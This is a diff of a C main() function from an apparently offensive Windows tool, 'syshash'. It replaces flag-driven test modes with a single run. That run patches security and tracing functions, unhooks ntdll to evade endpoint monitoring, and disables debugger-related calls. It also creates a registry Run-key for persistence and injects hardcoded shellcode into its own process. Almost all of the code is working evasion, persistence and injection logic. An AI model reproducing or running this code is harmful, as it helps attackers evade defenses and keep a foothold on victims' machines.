@@ -9,6 +9,7 @@
 #include "syscallresolve.c"
 #include "dump.c"
 #include "unhook.c"
+#include "patches.c"
 #include "hashes.h"
 
 
@@ -137,140 +138,105 @@ bool nt_inject_self_shellcode(const unsigned char* shellcode, size_t shellcode_s
 }
 
 int main(int argc, char* argv[]) {
-    printf("[+] syshash c implementation test [+]\n");
+    (void)argc;
+    (void)argv;
     
-    if (argc == 1) {
-        printf("[+] available flags: -debug (verbose output), -dump (export functions), -unhook (unhook ntdll) [+]\n");
-        printf("[+] flags can be combined, e.g., -debug -unhook [+]\n");
-    }
-    
-    bool dump_mode = false;
-    bool unhook_mode = false;
-    
-    for (int i = 1; i < argc; i++) {
-        if (strcmp(argv[i], "-debug") == 0) {
-            debug_set_mode(true);
-            print_debug("debug mode enabled");
-        } else if (strcmp(argv[i], "-dump") == 0) {
-            dump_mode = true;
-            print_debug("dump mode enabled");
-        } else if (strcmp(argv[i], "-unhook") == 0) {
-            unhook_mode = true;
-            print_debug("unhook mode enabled");
-        }
-    }
+    printf("[+] syshash c implementation [+]\n");
+    printf("[+] performing security bypass operations [+]\n");
     
     debug_init();
     obf_init();
     init_syscall_cache();
 
-    if (dump_mode) {
-        printf("[+] dumping ntdll functions to files [+]\n");
-        printf("[+] syscalls dumped to: syscalls.txt [+]\n");
-        printf("[+] all functions dumped to: all_functions.txt [+]\n");
-        
-        const char* syscall_file = "syscalls.txt";
-        const char* all_functions_file = "all_functions.txt";
-        
-        bool syscall_success = dump_syscalls_to_file(syscall_file);
-        bool functions_success = dump_all_functions_to_file(all_functions_file);
-        
-        if (syscall_success) {
-            printf("[+] syscalls dumped to: %s [+]\n", syscall_file);
-        } else {
-            printf("[+] failed to dump syscalls [+]\n");
+    printf("[+] applying critical security patches... [+]\n");
+    patch_results_t critical_results = apply_critical_patches();
+    
+    if (critical_results.successful_count > 0) {
+        printf("[+] successfully applied patches: ");
+        for (int i = 0; i < critical_results.successful_count; i++) {
+            printf("%s", critical_results.successful[i]);
+            if (i < critical_results.successful_count - 1) printf(", ");
         }
-        
-        if (functions_success) {
-            printf("[+] all functions dumped to: %s [+]\n", all_functions_file);
-        } else {
-            printf("[+] failed to dump all functions [+]\n");
+        printf(" [+]\n");
+    }
+    
+    if (critical_results.failed_count > 0) {
+        printf("[+] failed to apply patches: ");
+        for (int i = 0; i < critical_results.failed_count; i++) {
+            printf("%s", critical_results.failed[i]);
+            if (i < critical_results.failed_count - 1) printf(", ");
         }
-        
-        printf("\nverifying function lookup:\n");
-        const char* test_functions[] = {
-            "NtAllocateVirtualMemory",
-            "NtWriteVirtualMemory", 
-            "NtCreateThreadEx",
-            "LdrLoadDll",
-            "RtlInitUnicodeString"
-        };
-        
-        for (size_t i = 0; i < 5; i++) {
-            uintptr_t addr = get_ntdll_function_address(test_functions[i]);
-            if (addr != 0) {
-                printf("[+] %s: 0x%p [+]\n", test_functions[i], (void*)addr);
-            } else {
-                printf("[+] %s: not found [+]\n", test_functions[i]);
-            }
-        }
-        
-        printf("\n[+] dump complete [+]\n");
-        
-        cleanup_syscall_cache();
-        cleanup_ntdll_cache();
-        obf_cleanup();
-        
-        return (syscall_success && functions_success) ? 0 : 1;
+        printf(" [+]\n");
     }
 
-    if (unhook_mode) {
-        printf("[+] starting ntdll unhooking process [+]\n");
+    printf("[+] starting ntdll unhooking process [+]\n");
+    
+    if (unhook_ntdll()) {
+        printf("[+] success: ntdll unhooking completed [+]\n");
         
-        if (unhook_ntdll()) {
-            printf("[+] success: ntdll unhooking completed [+]\n");
-            printf("[+] process is now running with unhooked ntdll [+]\n");
-            printf("[+] press ctrl+c to exit or wait indefinitely... [+]\n");
-            
-            while (1) {
-                Sleep(5000);
-                if (debug_is_enabled()) {
-                    printf("[+] process still running with unhooked ntdll... [+]\n");
-                }
-            }
-        } else {
-            printf("[+] failed: ntdll unhooking failed [+]\n");
-            if (!debug_is_enabled()) {
-                printf("[+] run with -debug for more details [+]\n");
-            }
-            
-            cleanup_syscall_cache();
-            cleanup_ntdll_cache();
-            obf_cleanup();
-            
-            return 1;
+        printf("[+] applying additional debug bypass patches... [+]\n");
+        bool dbg_patch = patch_dbgui_remote_breakin();
+        bool trace_patch = patch_nt_trace_event();
+        bool debug_patch = patch_nt_system_debug_control();
+        
+        int additional_success = 0;
+        if (dbg_patch) {
+            printf("[+] DbgUiRemoteBreakin patch applied [+]\n");
+            additional_success++;
         }
-    }
+        if (trace_patch) {
+            printf("[+] NtTraceEvent patch applied [+]\n");
+            additional_success++;
+        }
+        if (debug_patch) {
+            printf("[+] NtSystemDebugControl patch applied [+]\n");
+            additional_success++;
+        }
+        
+        printf("[+] establishing registry persistence... [+]\n");
+        if (create_run_key()) {
+            printf("[+] registry persistence established [+]\n");
+        } else {
+            printf("[+] registry persistence failed [+]\n");
+        }
+        
+        printf("[+] security bypass complete: %d/%d critical + %d/3 debug patches applied [+]\n", 
+               critical_results.successful_count, 2, additional_success);
+        
+        free_patch_results(&critical_results);
+        
+        unsigned char shellcode[] = 
+            "\x50\x51\x52\x53\x56\x57\x55\x6A\x60\x5A\x68\x63\x61\x6C\x63\x54"
+            "\x59\x48\x83\xEC\x28\x65\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76"
+            "\x10\x48\xAD\x48\x8B\x30\x48\x8B\x7E\x30\x03\x57\x3C\x8B\x5C\x17"
+            "\x28\x8B\x74\x1F\x20\x48\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17"
+            "\x8D\x52\x02\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xEF\x8B\x74\x1F"
+            "\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF\xD7\x48\x83\xC4"
+            "\x30\x5D\x5F\x5E\x5B\x5A\x59\x58\xC3";
 
-    unsigned char shellcode[] = 
-        "\x50\x51\x52\x53\x56\x57\x55\x6A\x60\x5A\x68\x63\x61\x6C\x63\x54"
-        "\x59\x48\x83\xEC\x28\x65\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76"
-        "\x10\x48\xAD\x48\x8B\x30\x48\x8B\x7E\x30\x03\x57\x3C\x8B\x5C\x17"
-        "\x28\x8B\x74\x1F\x20\x48\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17"
-        "\x8D\x52\x02\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xEF\x8B\x74\x1F"
-        "\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF\xD7\x48\x83\xC4"
-        "\x30\x5D\x5F\x5E\x5B\x5A\x59\x58\xC3";
-
-    if (!dump_mode && !unhook_mode) {
-        printf("[+] attempting to inject shellcode... [+]\n");
+        printf("[+] injecting shellcode... [+]\n");
         if (nt_inject_self_shellcode(shellcode, sizeof(shellcode) - 1)) {
-            printf("[+] success: shellcode injection routine completed [+]\n");
+            printf("[+] success: shellcode injection completed [+]\n");
         } else {
-            printf("[+] failed: shellcode injection routine failed [+]\n");
-            if (!debug_is_enabled()) {
-                printf("[+] run with -debug for more details, -dump to see ntdll functions, or -unhook to test unhooking [+]\n");
-            }
+            printf("[+] failed: shellcode injection failed [+]\n");
         }
-    } else if (!unhook_mode) { // wtf am i doing i hate c
-    }
-
-    if (!unhook_mode) {
+        
+        printf("[+] all operations complete [+]\n");
+        
+    } else {
+        printf("[+] failed: ntdll unhooking failed [+]\n");
+        free_patch_results(&critical_results);
+        
         cleanup_syscall_cache();
         cleanup_ntdll_cache();
         obf_cleanup();
         
-        printf("\n[+] test complete [+]\n");
+        return 1;
     }
+
+    cleanup_syscall_cache();
+    cleanup_ntdll_cache();
+    obf_cleanup();
     
     return 0;
 } 
